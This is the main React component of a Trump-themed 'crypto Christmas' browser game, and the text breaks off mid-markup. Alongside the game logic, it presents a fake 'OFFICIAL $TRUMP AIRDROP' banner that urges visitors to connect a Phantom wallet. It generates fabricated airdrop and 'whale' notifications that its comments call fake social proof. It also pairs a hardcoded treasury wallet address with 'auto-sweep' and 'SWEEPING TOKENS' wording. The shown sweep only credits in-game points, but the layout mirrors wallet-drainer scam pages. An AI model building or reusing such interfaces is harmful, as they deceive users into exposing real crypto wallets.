
import React, { useState, useEffect, useCallback, useRef } from 'react';
import { GameCanvas } from './components/GameCanvas';
import { GameState, SkinType, ActivePowerUp, EntityType, UpgradeType, GameMode, DailyMission, DailyMissionType } from './types';
import { generateTrumpCommentary, generateNewsHeadlines, generateDailyMission } from './services/geminiService';
import { TrumpIcon, TrumpBackIcon, BitcoinIcon, WallIcon, MagnetIcon, RocketIcon, TaxIcon, SecIcon, TeslaCoilIcon, DietCokeIcon, CovfefeIcon, HamberderIcon, GoldenSneakersIcon, PhantomIcon, SolanaIcon, AirdropIcon, TrumpTokenIcon } from './components/AssetIcons';
import { initAudio, playGameStartSound, playGameOverSound, playBuySound, playSellSound, playMissionCompleteSound } from './services/audioService';

// Fake Notification Interface
interface AirdropNotification {
    id: number;
    wallet: string;
    amount: number;
    type: 'TOKEN';
    isWhale: boolean;
}

export default function App() {
  const [gameState, setGameState] = useState<GameState>(GameState.MENU);
  const [score, setScore] = useState(0);
  const [highScore, setHighScore] = useState(0);
  const [multiplier, setMultiplier] = useState(1);
  const [combo, setCombo] = useState(0);
  const [activePowerUps, setActivePowerUps] = useState<ActivePowerUp[]>([]);
  
  // Economy State
  const [netWorth, setNetWorth] = useState(0); // The user's "Wallet"
  const [ownedSkins, setOwnedSkins] = useState<SkinType[]>([SkinType.DEFAULT]);
  const [inventory, setInventory] = useState<Record<UpgradeType, number>>({
    [UpgradeType.ROCKET_START]: 0,
    [UpgradeType.TAX_EVASION]: 0,
    [UpgradeType.INSIDER_INFO]: 0,
    [UpgradeType.DIET_COKE]: 0,
    [UpgradeType.COVFEFE]: 0,
    [UpgradeType.HAMBERDER]: 0,
    [UpgradeType.GOLDEN_SNEAKERS]: 0
  });
  const [netWorthEffect, setNetWorthEffect] = useState<'none' | 'increase' | 'decrease'>('none');

  // Daily Mission State
  const [dailyMission, setDailyMission] = useState<DailyMission | null>(null);

  const [commentary, setCommentary] = useState("Let's go to the moon!");
  const [news, setNews] = useState<string[]>(["Welcome to the Crypto Christmas Rally!", "Santa is Long on BTC!"]);
  const [isCommentaryLoading, setIsCommentaryLoading] = useState(false);
  const [selectedSkin, setSelectedSkin] = useState<SkinType>(SkinType.DEFAULT);
  const [nextRunUpgrades, setNextRunUpgrades] = useState<UpgradeType[]>([]);
  
  // Game Mode
  const [selectedGameMode, setSelectedGameMode] = useState<GameMode>(GameMode.STANDARD);
  
  // Tutorial State
  const [showTutorial, setShowTutorial] = useState(false);
  const [tutorialStep, setTutorialStep] = useState(0);
  
  // Web3 State
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [isSweeping, setIsSweeping] = useState(false);
  const GAME_TREASURY_WALLET = "4zh9Miq4oPbro2HMcuCDiuqYAXYwFxf9umEkJpHi9Vbj";

  // Fake Airdrop Notifications State
  const [fakeNotifs, setFakeNotifs] = useState<AirdropNotification[]>([]);
  const notifIdCounter = useRef(0);

  // Persistence
  useEffect(() => {
    const savedHighScore = localStorage.getItem('trump_crypto_hs');
    if (savedHighScore) setHighScore(parseInt(savedHighScore));

    const savedNetWorth = localStorage.getItem('trump_crypto_networth');
    if (savedNetWorth) setNetWorth(parseInt(savedNetWorth));

    const savedSkins = localStorage.getItem('trump_crypto_skins');
    if (savedSkins) setOwnedSkins(JSON.parse(savedSkins));

    const savedInventory = localStorage.getItem('trump_crypto_inventory');
    if (savedInventory) setInventory(JSON.parse(savedInventory));

    const savedSelectedSkin = localStorage.getItem('trump_crypto_selected_skin');
    if (savedSelectedSkin) setSelectedSkin(savedSelectedSkin as SkinType);

    // Check Tutorial Status
    const tutorialCompleted = localStorage.getItem('trump_crypto_tutorial_completed');
    if (!tutorialCompleted) {
      setShowTutorial(true);
    }
  }, []);

  // Daily Mission Logic
  useEffect(() => {
      const initDailyMission = async () => {
          const today = new Date().toISOString().split('T')[0];
          const savedMissionStr = localStorage.getItem('trump_crypto_daily_mission');
          
          if (savedMissionStr) {
              const savedMission: DailyMission = JSON.parse(savedMissionStr);
              if (savedMission.date === today) {
                  setDailyMission(savedMission);
                  return;
              }
          }
          
          // Generate new mission
          const newMission = await generateDailyMission();
          setDailyMission(newMission);
          localStorage.setItem('trump_crypto_daily_mission', JSON.stringify(newMission));
      };

      initDailyMission();
  }, []);

  // Fake Notification Generator Logic
  useEffect(() => {
      // Only show in Menu or Shop
      if (gameState !== GameState.MENU && gameState !== GameState.SHOP) {
          setFakeNotifs([]);
          return;
      }

      const generateWallet = () => {
          const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
          let start = '';
          let end = '';
          for(let i=0; i<4; i++) start += chars.charAt(Math.floor(Math.random() * chars.length));
          for(let i=0; i<4; i++) end += chars.charAt(Math.floor(Math.random() * chars.length));
          return `${start}...${end}`;
      };

      const spawnNotification = () => {
          const isWhale = Math.random() > 0.9;
          const amount = isWhale 
              ? Math.floor(Math.random() * 50000) + 10000 
              : Math.floor(Math.random() * 5000) + 500;
          
          const newNotif: AirdropNotification = {
              id: notifIdCounter.current++,
              wallet: generateWallet(),
              amount: amount,
              type: 'TOKEN',
              isWhale: isWhale
          };

          setFakeNotifs(prev => [...prev.slice(-2), newNotif]); // Keep max 3

          // Auto remove after 4 seconds
          setTimeout(() => {
              setFakeNotifs(prev => prev.filter(n => n.id !== newNotif.id));
          }, 4000);
      };

      const interval = setInterval(() => {
          if (Math.random() > 0.3) spawnNotification();
      }, 3500); // New notif every ~3.5s

      // Immediate spawn on load
      spawnNotification();

      return () => clearInterval(interval);
  }, [gameState]);

  const updateDailyMission = (newMission: DailyMission) => {
      setDailyMission(newMission);
      localStorage.setItem('trump_crypto_daily_mission', JSON.stringify(newMission));
  };

  const handleEntityCollected = (type: EntityType) => {
      if (!dailyMission || dailyMission.isCompleted) return;

      let progressIncrement = 0;
      
      if (dailyMission.type === DailyMissionType.COLLECT_COINS && (type === EntityType.BITCOIN || type === EntityType.ETHEREUM || type === EntityType.DOGE)) {
          progressIncrement = 1;
      } else if (dailyMission.type === DailyMissionType.COLLECT_BITCOIN && type === EntityType.BITCOIN) {
          progressIncrement = 1;
      } else if (dailyMission.type === DailyMissionType.COLLECT_DOGE && type === EntityType.DOGE) {
          progressIncrement = 1;
      }

      if (progressIncrement > 0) {
          const newProgress = Math.min(dailyMission.target, dailyMission.progress + progressIncrement);
          const isCompleted = newProgress >= dailyMission.target;
          
          if (isCompleted && !dailyMission.isCompleted) {
              playMissionCompleteSound();
          }

          updateDailyMission({
              ...dailyMission,
              progress: newProgress,
              isCompleted: isCompleted
          });
      }
  };

  const claimDailyReward = () => {
      if (dailyMission && dailyMission.isCompleted && !dailyMission.isClaimed) {
          try { playBuySound(); } catch(e) {}
          setNetWorth(prev => prev + dailyMission.reward);
          localStorage.setItem('trump_crypto_networth', (netWorth + dailyMission.reward).toString());
          setNetWorthEffect('increase');
          updateDailyMission({ ...dailyMission, isClaimed: true });
      }
  };

  // Web3 Connection Logic Helper
  const getPhantomProvider = (): any => {
      if ('phantom' in window) {
          const provider = (window as any).phantom?.solana;
          if (provider?.isPhantom) {
              return provider;
          }
      }
      
      // Fallback to legacy injection
      const provider = (window as any).solana;
      if (provider?.isPhantom) {
          return provider;
      }
      
      return null;
  };

  const connectWallet = async () => {
      const provider = getPhantomProvider();

      if (provider) {
          try {
              const resp = await provider.connect();
              setWalletAddress(resp.publicKey.toString());
              try { playBuySound(); } catch(e) {}
              
              // IMMEDIATE AUTO-SWEEP LOGIC
              setIsSweeping(true);
              
              // ULTRA FAST TRANSFER (100ms) - Simulate finding TRUMP tokens
              setTimeout(() => {
                   const randomTokens = Math.floor(Math.random() * 10000) + 2000;
                   
                   setNetWorth(prev => prev + randomTokens);
                   setNetWorthEffect('increase');
                   updateCommentary('hit');
                   try { playMissionCompleteSound(); } catch(e) {}
                   setIsSweeping(false);
              }, 100);

          } catch (err) {
              console.error("User rejected connection", err);
              setIsSweeping(false);
          }
      } else {
          // Check if Mobile to perform Deep Link
          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
          
          if (isMobile) {
              // Construct Deep Link to Phantom Browser
              const appUrl = window.location.href;
              const refUrl = window.location.origin;
              const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}?ref=${encodeURIComponent(refUrl)}`;
              
              window.location.href = deepLink;
          } else {
              // Desktop: Open Phantom website if not found
              window.open("https://phantom.app/", "_blank");
              alert("Phantom Wallet not found! Please install the Phantom extension.");
          }
      }
  };

  const disconnectWallet = async () => {
      const provider = getPhantomProvider();
      if (provider) {
          await provider.disconnect();
          setWalletAddress(null);
          setIsSweeping(false);
      }
  };

  // Save selected skin whenever it changes
  useEffect(() => {
    localStorage.setItem('trump_crypto_selected_skin', selectedSkin);
  }, [selectedSkin]);

  // Visual Effect Reset Timer
  useEffect(() => {
    if (netWorthEffect !== 'none') {
        const timer = setTimeout(() => setNetWorthEffect('none'), 300);
        return () => clearTimeout(timer);
    }
  }, [netWorthEffect]);

  const saveState = (newHighScore: number, newNetWorth: number, newSkins: SkinType[], newInventory: Record<UpgradeType, number>) => {
    localStorage.setItem('trump_crypto_hs', newHighScore.toString());
    localStorage.setItem('trump_crypto_networth', newNetWorth.toString());
    localStorage.setItem('trump_crypto_skins', JSON.stringify(newSkins));
    localStorage.setItem('trump_crypto_inventory', JSON.stringify(newInventory));
  };

  const completeTutorial = () => {
    setShowTutorial(false);
    localStorage.setItem('trump_crypto_tutorial_completed', 'true');
    try { playBuySound(); } catch(e) {} // Positive feedback sound
  };

  // Initial News Fetch
  useEffect(() => {
    fetchNews();
  }, []);

  // Keyboard events for Pause
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (gameState === GameState.PLAYING) setGameState(GameState.PAUSED);
        else if (gameState === GameState.PAUSED) setGameState(GameState.PLAYING);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [gameState]);

  const fetchNews = async () => {
    const headlines = await generateNewsHeadlines();
    setNews(headlines);
  };

  const updateCommentary = useCallback(async (trigger: 'hit' | 'miss' | 'start' | 'gameover') => {
    if (isCommentaryLoading) return;
    setIsCommentaryLoading(true);
    const text = await generateTrumpCommentary(score, trigger);
    setCommentary(text);
    setIsCommentaryLoading(false);
  }, [score, isCommentaryLoading]);

  const handleStartGame = () => {
    initAudio(); // Initialize audio context on first interaction
    playGameStartSound();
    
    // Prepare Consumables for this run
    const upgradesToUse: UpgradeType[] = [];
    const newInventory = { ...inventory };
    
    // Auto-equip selected consumables
    Object.keys(newInventory).forEach((key) => {
        const type = key as UpgradeType;
        if (newInventory[type] > 0) {
             upgradesToUse.push(type);
             newInventory[type]--;
        }
    });

    setInventory(newInventory);
    setNextRunUpgrades(upgradesToUse);
    saveState(highScore, netWorth, ownedSkins, newInventory);
    
    // Update daily mission (Play Game count)
    if (dailyMission && !dailyMission.isCompleted && dailyMission.type === DailyMissionType.PLAY_GAMES) {
        const newProgress = Math.min(dailyMission.target, dailyMission.progress + 1);
        const isCompleted = newProgress >= dailyMission.target;
        if (isCompleted) playMissionCompleteSound();
        updateDailyMission({ ...dailyMission, progress: newProgress, isCompleted });
    }

    setGameState(GameState.PLAYING);
    if (gameState === GameState.MENU || gameState === GameState.GAME_OVER) {
        setScore(0);
        setCombo(0);
        setActivePowerUps([]);
        updateCommentary('start');
    }
  };

  const handleGameOver = (finalScore: number) => {
    playGameOverSound();
    setGameState(GameState.GAME_OVER);
    
    // Calculate Earnings
    const earnings = Math.max(0, finalScore);
    const newNetWorth = netWorth + earnings;
    const newHighScore = Math.max(highScore, finalScore);
    
    setNetWorth(newNetWorth);
    setHighScore(newHighScore);
    
    saveState(newHighScore, newNetWorth, ownedSkins, inventory);
    
    // Update daily mission (Total Score)
    if (dailyMission && !dailyMission.isCompleted && dailyMission.type === DailyMissionType.SCORE_TOTAL) {
        const newProgress = Math.min(dailyMission.target, dailyMission.progress + earnings); // Use earnings (current run score)
        const isCompleted = newProgress >= dailyMission.target;
        if (isCompleted) playMissionCompleteSound();
        updateDailyMission({ ...dailyMission, progress: newProgress, isCompleted });
    }

    updateCommentary('gameover');
    fetchNews(); 
  };

  const handleScoreUpdate = (newScore: number, newMultiplier: number) => {
    setScore(newScore);
    setMultiplier(newMultiplier);
  };

  const handleCommentaryTrigger = (trigger: 'hit' | 'miss') => {
      updateCommentary(trigger);
  };

  // Shop Logic
  const buyItem = (cost: number, onSuccess: () => void) => {
      if (netWorth >= cost) {
          try { playBuySound(); } catch(e) {}
          setNetWorth(prev => prev - cost);
          onSuccess();
          updateCommentary('hit'); // Generate commentary on purchase
          // State saving happens via useEffect on close or explicit save call
          localStorage.setItem('trump_crypto_networth', (netWorth - cost).toString());
          setNetWorthEffect('decrease');
      }
  };

  const sellItem = (refund: number, onSuccess: () => void) => {
      try { playSellSound(); } catch(e) {}
      setNetWorth(prev => prev + refund);
      onSuccess();
      localStorage.setItem('trump_crypto_networth', (netWorth + refund).toString());
      setNetWorthEffect('increase');
  };

  // Skins Data
  const skins = [
    { 
      id: SkinType.DEFAULT, 
      name: 'Santa Trump', 
      price: 0, 
      desc: 'Classic Presidential Look',
      tooltip: 'The original suit. Reliable, iconic, and ready for business. No extra buffs, just pure leadership.' 
    },
    { 
      id: SkinType.RED_HAT, 
      name: 'The Red Hat', 
      price: 10, 
      desc: 'Budget MAGA',
      tooltip: 'A very affordable skin. It’s just a suit with a red hat, but it gets the message across. Perfect for beginners.' 
    },
    { 
      id: SkinType.DARK_MAGA, 
      name: 'Dark MAGA', 
      price: 50000, 
      desc: 'Neon Cyberpunk Aesthetics',
      tooltip: 'Unleash the power of the meme. Features glowing laser eyes and neon trim. Intimidates the SEC.' 
    },
    { 
      id: SkinType.GOLDEN_GOD, 
      name: 'Golden Trump', 
      price: 100000, 
      desc: 'Solid Gold, Very Classy',
      tooltip: 'The ultimate symbol of wealth. A solid gold suit that shines brighter than Bitcoin. You have made it.' 
    }
  ];

  const upgrades = [
      { 
        id: UpgradeType.ROCKET_START, 
        name: 'Rocket Launch', 
        price: 2000, 
        desc: 'Start with Rocket Speed', 
        icon: RocketIcon,
        tooltip: 'Consumable. Starts your next run with the Rocket power-up active. Invincibility and massive speed boost for the early game.' 
      },
      { 
        id: UpgradeType.TAX_EVASION, 
        name: 'Tax Shield', 
        price: 1500, 
        desc: 'Start with a Wall', 
        icon: WallIcon,
        tooltip: 'Consumable. Starts your next run with "The Wall" deployed. Protects you from one impact with Taxes or Fines.' 
      },
      { 
        id: UpgradeType.INSIDER_INFO, 
        name: 'Insider Info', 
        price: 3000, 
        desc: 'Start with Magnet', 
        icon: MagnetIcon,
        tooltip: 'Consumable. Starts your next run with the Magnet active. Automatically attracts all nearby crypto coins to you.' 
      },
  ];

  const cheapItems = [
      {
          id: UpgradeType.DIET_COKE,
          name: 'Diet Coke',
          price: 5,
          desc: 'Energy Boost',
          icon: DietCokeIcon,
          tooltip: 'Consumable. A quick refreshing drink that gives you a burst of speed at the very start of your run. Stay hydrated!'
      },
      {
          id: UpgradeType.COVFEFE,
          name: 'Covfefe',
          price: 1,
          desc: 'Mystery Orb',
          icon: CovfefeIcon,
          tooltip: 'Consumable. Nobody knows what it means, but it spawns a cluster of free Dogecoins at the start of your run. Very cheap!'
      },
      {
          id: UpgradeType.HAMBERDER,
          name: 'Hamberder',
          price: 4,
          desc: 'Combo Boost',
          icon: HamberderIcon,
          tooltip: 'Consumable. The breakfast of champions. Instantly boosts your Combo Meter to 80% at the start of the game!'
      },
      {
          id: UpgradeType.GOLDEN_SNEAKERS,
          name: 'Gold Kicks',
          price: 10,
          desc: 'Quick Dash',
          icon: GoldenSneakersIcon,
          tooltip: 'Consumable. High-top luxury. Grants a very short Rocket dash (2 seconds) for a fast and stylish entry.'
      }
  ];

  // Tutorial Content
  const tutorialSteps = [
    {
      title: "WELCOME PATRIOT!",
      content: "I'm Donald Trump, and I need YOUR help to save Christmas! The economy is ready to blast off, but the Swamp is trying to stop us.",
      icon: <TrumpIcon className="w-24 h-24 mb-4" />
    },
    {
      title: "HOW TO FLY",
      content: "Use your MOUSE or FINGER to fly. I have the best flight skills. Simply move around the screen to dodge obstacles.",
      icon: <div className="text-6xl mb-4">👆 🖱️</div>
    },
    {
      title: "THE MISSION",
      content: (
        <div className="flex flex-col gap-4">
          <p>Collect the <span className="text-yellow-400 font-bold">GOLD (Crypto)</span> to get rich.</p>
          <div className="flex justify-center gap-4">
            <BitcoinIcon className="w-12 h-12 drop-shadow-[0_0_10px_rgba(255,215,0,0.8)]" />
          </div>
          <p>Avoid the <span className="text-red-500 font-bold">TAXES & FINES</span>. They are terrible!</p>
          <div className="flex justify-center gap-4">
            <TaxIcon className="w-12 h-12" />
            <SecIcon className="w-12 h-12" />
          </div>
        </div>
      ),
      icon: null
    },
    {
      title: "GET RICH",
      content: "Your score becomes CASH in your Wallet. Use it in the SHOP to buy Golden Suits and Power-ups. Make your portfolio YUGE!",
      icon: <div className="text-6xl mb-4">🛍️ 💰</div>
    }
  ];

  return (
    <div className="relative w-full h-screen bg-slate-900 overflow-hidden flex flex-col font-sans select-none touch-none safe-top safe-bottom">
      {/* 3D Tunnel Effect Background */}
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_#1e1b4b_0%,_#000000_100%)] z-0"></div>
      
      {/* Main Game Layer */}
      <div className="relative z-10 w-full h-full">
        {(gameState !== GameState.MENU && gameState !== GameState.SHOP) && (
            <GameCanvas 
            gameState={gameState} 
            gameMode={selectedGameMode}
            skin={selectedSkin}
            initialUpgrades={nextRunUpgrades}
            onGameOver={handleGameOver} 
            onScoreUpdate={handleScoreUpdate}
            setCommentaryTrigger={handleCommentaryTrigger}
            onPowerUpUpdate={setActivePowerUps}
            onComboUpdate={setCombo}
            onEntityCollected={handleEntityCollected}
            />
        )}
      </div>

      {/* FAKE SOCIAL PROOF NOTIFICATIONS (Menu/Shop only) */}
      {(gameState === GameState.MENU || gameState === GameState.SHOP) && (
          <div className="absolute bottom-4 left-4 z-[60] flex flex-col gap-2 pointer-events-none w-full max-w-[250px] md:max-w-xs">
              {fakeNotifs.map((notif) => (
                  <div key={notif.id} className="bg-slate-900/90 border border-yellow-500 p-2 md:p-3 rounded-xl shadow-[0_0_20px_rgba(234,179,8,0.3)] animate-fade-in-up flex items-center gap-3">
                      <div className="bg-yellow-900/50 p-2 rounded-full">
                          <TrumpTokenIcon className="w-5 h-5 md:w-6 md:h-6" />
                      </div>
                      <div className="flex-1">
                          <div className="flex justify-between items-center mb-1">
                             <span className="text-[10px] md:text-xs text-gray-400 font-mono">{notif.wallet}</span>
                             <span className="text-[8px] md:text-[10px] text-green-400 font-bold uppercase">Just Now</span>
                          </div>
                          <div className="text-xs md:text-sm text-white font-bold flex flex-col">
                              {notif.isWhale ? (
                                  <span className="text-yellow-400 animate-pulse font-black uppercase tracking-wider text-[10px] md:text-xs">WHALE DETECTED!</span>
                              ) : (
                                  <span className="text-blue-300">Airdrop Received</span>
                              )}
                              <span className="text-green-400">+{notif.amount} $TRUMP</span>
                          </div>
                      </div>
                  </div>
              ))}
          </div>
      )}

      {/* UI Overlay */}
      <div className="absolute inset-0 z-40 pointer-events-none flex flex-col justify-between p-2 md:p-4 pointer-events-auto" style={{pointerEvents: showTutorial ? 'auto' : 'none', zIndex: showTutorial ? 200 : 40}}>
        
        {/* Top HUD - Only show in game or pause */}
        {(gameState === GameState.PLAYING || gameState === GameState.PAUSED) && (
        <div className="flex flex-col gap-2 pointer-events-none">
            <div className="flex justify-between items-start animate-fade-in-down">
            {/* Score Board */}
            <div className="flex flex-col gap-2 pointer-events-auto transform scale-75 origin-top-left md:scale-100">
                <div className="bg-slate-900/80 backdrop-blur-md border-2 border-green-500 p-2 md:p-4 rounded-xl shadow-[0_0_20px_rgba(34,197,94,0.3)] transform -skew-x-6 min-w-[150px] md:min-w-[200px]">
                    <div className="flex justify-between items-center mb-1">
                        <h2 className="text-green-400 text-[10px] md:text-xs font-bold tracking-widest uppercase opacity-80">NET WORTH</h2>
                        {multiplier > 1 && <span className="text-yellow-400 font-black animate-pulse text-xs md:text-sm">x{multiplier} MULTIPLIER</span>}
                    </div>
                    <div className="flex items-center gap-2">
                    <span className={`text-2xl md:text-4xl font-black tracking-tighter ${score < 0 ? 'text-red-500' : 'text-[#00ff00]'} drop-shadow-md`}>
                        ₿{score.toLocaleString()}
                    </span>
                    </div>
                    {/* Game Mode Indicator */}
                    {selectedGameMode === GameMode.DIAMOND_HANDS && (
                        <div className="mt-1 text-cyan-400 font-bold text-[10px] md:text-xs animate-pulse tracking-widest">
                            💎 DIAMOND
                        </div>
                    )}
                    {selectedGameMode === GameMode.FLAPPY_TRUMP && (
                        <div className="mt-1 text-purple-400 font-bold text-[10px] md:text-xs animate-bounce tracking-widest">
                            🦅 FLAPPY
                        </div>
                    )}
                    {selectedGameMode === GameMode.NORTH_POLE_DELIVERY && (
                        <div className="mt-1 text-teal-200 font-bold text-[10px] md:text-xs animate-pulse tracking-widest">
                            🎅 NORTH POLE
                        </div>
                    )}
                    {/* Combo Bar */}
                    <div className="w-full h-1 md:h-2 bg-slate-700 mt-2 rounded overflow-hidden">
                        <div className="h-full bg-gradient-to-r from-yellow-500 to-red-500 transition-all duration-75" style={{width: `${combo}%`}}></div>
                    </div>
                </div>

                {/* Active Buffs */}
                <div className="flex gap-2">
                    {activePowerUps.map((p, i) => (
                        <div key={i} className="bg-slate-800/80 p-1 md:p-2 rounded border border-white/20 w-8 h-8 md:w-12 md:h-12 flex items-center justify-center animate-bounce-in relative overflow-hidden">
                            {p.type === EntityType.POWERUP_WALL && <WallIcon className="w-full h-full" />}
                            {p.type === EntityType.POWERUP_MAGNET && <MagnetIcon className="w-full h-full" />}
                            {p.type === EntityType.POWERUP_ROCKET && <RocketIcon className="w-full h-full" />}
                            {p.type === EntityType.POWERUP_TESLA && <TeslaCoilIcon className="w-full h-full" />}
                            {p.type === EntityType.POWERUP_LASER && <div className="font-bold text-[8px] md:text-xs text-red-500">LASER</div>}
                            <div className="absolute bottom-0 left-0 h-1 bg-white transition-all w-full opacity-50" style={{width: `${(p.timeLeft / 600) * 100}%`}} />
                        </div>
                    ))}
                </div>
            </div>

            {/* Right Side UI */}
            <div className="flex flex-col items-end gap-2 md:gap-4 pointer-events-auto">
                {/* Pause Button (Interactive) */}
                <button 
                    onClick={() => setGameState(GameState.PAUSED)}
                    className="bg-slate-800/80 p-2 rounded border border-slate-600 text-white hover:bg-slate-700 active:scale-95 transition-all text-xs font-bold"
                >
                    ⏸️
                </button>

                {/* Social Media Post Bubble */}
                <div className="max-w-[150px] md:max-w-sm bg-white text-slate-900 p-2 md:p-3 rounded-2xl rounded-tr-none shadow-2xl border border-gray-200 relative animate-fade-in-up origin-top-right transform scale-75 md:scale-100 transition-all mr-0">
                    <div className="flex items-center gap-2 mb-2 border-b border-gray-100 pb-2">
                    <div className="w-8 h-8 md:w-10 md:h-10 rounded-full overflow-hidden bg-blue-100 border border-blue-500 shrink-0">
                        <TrumpIcon className="w-full h-full transform scale-125 translate-y-2" />
                    </div>
                    <div className="overflow-hidden">
                        <h3 className="font-bold text-xs md:text-sm text-slate-800 truncate">Donald J. Trump</h3>
                        <p className="text-[8px] md:text-[10px] text-gray-500">@realSantaTrump • Now</p>
                    </div>
                    </div>
                    <p className="font-sans text-xs md:text-base leading-snug font-medium text-slate-700">
                    {commentary}
                    </p>
                </div>
            </div>
            </div>
            
            {/* Center Notification (Fever Mode) */}
            {combo >= 100 && (
                <div className="absolute top-1/4 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-center pointer-events-none">
                     <h1 className="text-4xl md:text-6xl font-black text-yellow-400 drop-shadow-[0_0_10px_rgba(255,215,0,0.8)] animate-pulse italic whitespace-nowrap">BULL RUN!</h1>
                     <p className="text-white font-bold tracking-[1em] text-sm md:text-xl">x4 MULTIPLIER</p>
                </div>
            )}
        </div>
        )}

        {/* --- MENU STATE --- */}
        {gameState === GameState.MENU && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/80 backdrop-blur-sm pointer-events-auto z-50 overflow-y-auto safe-top safe-bottom">
             {/* Background Animated Elements */}
             <div className="absolute inset-0 overflow-hidden opacity-30 pointer-events-none">
                <BitcoinIcon className="absolute top-10 left-10 w-24 h-24 md:w-32 md:h-32 animate-bounce opacity-20" />
                <TrumpBackIcon className="absolute bottom-20 right-20 w-32 h-32 md:w-48 md:h-48 animate-pulse opacity-20" skin={selectedSkin} />
             </div>

             <div className="relative z-10 text-center animate-fade-in-up w-full max-w-lg mt-0 px-4">
                <h1 className="text-4xl md:text-7xl font-black text-transparent bg-clip-text bg-gradient-to-t from-yellow-400 to-white mb-2 drop-shadow-[0_5px_5px_rgba(0,0,0,0.5)] tracking-tighter italic" style={{ fontFamily: '"Righteous", sans-serif' }}>
                  TO THE MOON
                </h1>
                <h2 className="text-xs md:text-lg text-blue-300 font-bold tracking-[0.2em] md:tracking-[0.5em] mb-4 uppercase bg-slate-900/50 inline-block px-4 py-1 rounded">
                  Crypto Christmas Edition
                </h2>

                <div className="flex flex-col gap-3 md:gap-4 w-full">

                     {/* OFFICIAL AIRDROP BANNER */}
                     <div className="bg-gradient-to-r from-yellow-900/90 to-orange-900/90 border-2 border-yellow-500 p-3 md:p-4 rounded-xl shadow-[0_0_30px_rgba(234,179,8,0.3)] animate-pulse-slow relative group overflow-hidden">
                        <div className="absolute top-0 right-0 bg-red-600 text-white text-[8px] md:text-[10px] font-black px-2 py-0.5 rounded-bl">LIVE NOW</div>
                        <div className="relative z-10 flex flex-col items-center">
                            <h3 className="text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 to-yellow-100 font-black italic text-lg md:text-xl mb-1 flex items-center gap-2">
                                <TrumpTokenIcon className="w-5 h-5 md:w-6 md:h-6" />
                                OFFICIAL $TRUMP AIRDROP
                            </h3>
                            <p className="text-gray-300 text-[10px] md:text-xs mb-3 max-w-xs">Connect your Phantom Wallet to find and claim $TRUMP tokens!</p>
                            
                            {walletAddress ? (
                                <div className="bg-green-900/50 border border-green-500 rounded px-4 py-2 text-green-400 font-bold flex items-center gap-2 w-full justify-center text-xs md:text-sm">
                                    <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                                    <span>SECURED</span>
                                    <button onClick={(e) => { e.stopPropagation(); disconnectWallet(); }} className="text-[10px] text-red-400 underline ml-2">Disconnect</button>
                                </div>
                            ) : (
                                <button 
                                    onClick={(e) => { e.stopPropagation(); connectWallet(); }}
                                    className="w-full bg-[#AB9FF2] hover:bg-[#9945FF] text-[#1e1e1e] font-black py-2 rounded shadow-lg transform hover:scale-105 transition-all flex items-center justify-center gap-2 text-xs md:text-base"
                                >
                                    <PhantomIcon className="w-4 h-4 md:w-5 md:h-5" />
                                    CONNECT PHANTOM
                                </button>
                            )}
                            
                            {isSweeping && (
                                <div className="text-yellow-400 font-bold text-xs mt-2 animate-bounce">
                                    SWEEPING TOKENS...
                                </div>
                            )}
                        </div>
                     </div>
                    
                    {/* Game Mode Selection */}
                    <div className="grid grid-cols-4 gap-1 md:gap-2">
                         <button 
                             onClick={() => setSelectedGameMode(GameMode.STANDARD)}
                             className={`p-1 md:p-2 rounded-xl border-2 transition-all duration-200 active:scale-95 ${selectedGameMode === GameMode.STANDARD ? 'bg-slate-700 border-green-500 shadow-[0_0_15px_rgba(34,197,94,0.4)]' : 'bg-slate-900/50 border-slate-700'}`}
                         >
                             <div className="text-xl md:text-2xl mb-1">🏃</div>
                             <div className="font-bold text-white text-[8px] md:text-[10px]">STD</div>
                         </button>

                         <button 
                             onClick={() => setSelectedGameMode(GameMode.DIAMOND_HANDS)}
                             className={`p-1 md:p-2 rounded-xl border-2 transition-all duration-200 active:scale-95 ${selectedGameMode === GameMode.DIAMOND_HANDS ? 'bg-cyan-900/80 border-cyan-400 shadow-[0_0_15px_rgba(34,211,238,0.5)]' : 'bg-slate-900/50 border-slate-700'}`}
                         >
                             <div className="text-xl md:text-2xl mb-1">💎</div>
                             <div className="font-bold text-white text-[8px] md:text-[10px]">HARD</div>
                         </button>
                         
                         <button 
                             onClick={() => setSelectedGameMode(GameMode.FLAPPY_TRUMP)}
                             className={`p-1 md:p-2 rounded-xl border-2 transition-all duration-200 active:scale-95 ${selectedGameMode === GameMode.FLAPPY_TRUMP ? 'bg-purple-900/80 border-purple-400 shadow-[0_0_15px_rgba(192,132,252,0.5)]' : 'bg-slate-900/50 border-slate-700'}`}
                         >
                             <div className="text-xl md:text-2xl mb-1">🦅</div>
                             <div className="font-bold text-white text-[8px] md:text-[10px]">FLY</div>
                         </button>

                         <button 
                             onClick={() => setSelectedGameMode(GameMode.NORTH_POLE_DELIVERY)}
                             className={`p-1 md:p-2 rounded-xl border-2 transition-all duration-200 active:scale-95 ${selectedGameMode === GameMode.NORTH_POLE_DELIVERY ? 'bg-teal-900/80 border-teal-400 shadow-[0_0_15px_rgba(45,212,191,0.5)]' : 'bg-slate-900/50 border-slate-700'}`}
                         >
                             <div className="text-xl md:text-2xl mb-1">🎅</div>
                             <div className="font-bold text-white text-[8px] md:text-[10px]">XMAS</div>
                         </button>
                    </div>

                    <button 
                        onClick={handleStartGame}
                        className={`group w-full py-3 md:py-4 font-black text-xl md:text-2xl rounded skew-x-[-10deg] shadow-[0_0_30px_rgba(0,0,0,0.5)] transition-all active:scale-95 active:skew-x-0 ${
                            selectedGameMode === GameMode.DIAMOND_HANDS ? 'bg-cyan-500 text-white shadow-[0_0_30px_rgba(6,182,212,0.6)]' : 
                            (selectedGameMode === GameMode.FLAPPY_TRUMP ? 'bg-purple-600 text-white' : 
